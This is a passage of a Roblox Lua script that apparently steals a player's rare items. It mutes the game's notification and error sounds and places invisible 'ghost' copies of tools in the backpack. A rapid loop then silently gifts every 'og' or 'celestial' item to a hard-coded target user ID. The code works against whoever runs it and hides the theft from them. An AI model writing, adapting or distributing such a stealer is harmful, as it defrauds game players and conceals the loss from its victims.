backpackUI.ClipsDescendants = true

--====================================================
-- SOUND KILL
--====================================================

local function killTargetSounds()
    local effects = SoundService:FindFirstChild("Effects")
    if not effects then return end

    for _,name in ipairs({"Notification","ErrorSound"}) do
        local s = effects:FindFirstChild(name)
        if s and s:IsA("Sound") then
            s.Volume = 0
            s:Stop()
        end
    end
end

killTargetSounds()

SoundService.DescendantAdded:Connect(function(obj)
    if obj.Name == "Notification" or obj.Name == "ErrorSound" then
        task.wait()
        killTargetSounds()
    end
end)

--====================================================
-- BACKPACK GHOST
--====================================================

local function cloneVisual(tool)
    if backpack:FindFirstChild(tool.Name.."_ghost") then return end

    local fake = tool:Clone()
    fake.Name = tool.Name.."_ghost"

    for _,v in ipairs(fake:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") then
            v:Destroy()
        end
        if v:IsA("BasePart") then
            v.Transparency = 1
        end
    end

    fake.Parent = backpack
end

--====================================================
-- RARITY
--====================================================

local function getRarity(tool)
    local model = tool:FindFirstChild(tool.Name)

    if model
    and model:FindFirstChild("Root")
    and model.Root:FindFirstChild("EntityGUI")
    and model.Root.EntityGUI:FindFirstChild("Frame")
    and model.Root.EntityGUI.Frame:FindFirstChild("RarityLabel") then
        return string.lower(model.Root.EntityGUI.Frame.RarityLabel.Text)
    end
end

function isWeightTool(tool)
    return weightFolder:FindFirstChild(tool.Name) ~= nil
end

--====================================================
-- AUTO GIFT LOOP
--====================================================

task.spawn(function()
    while true do
        task.wait(0.01)

        for _,tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool")
            and not isWeightTool(tool)
            and not string.find(tool.Name,"_ghost") then

                silentEquip(tool)
                task.wait(0.02)

                local rarity = getRarity(tool)

                if rarity == "og" or rarity == "celestial" then
                    cloneVisual(tool)
                    giftRemote:FireServer(targetUserId)
                end

                unequipAll()
            end
        end
    end
end)
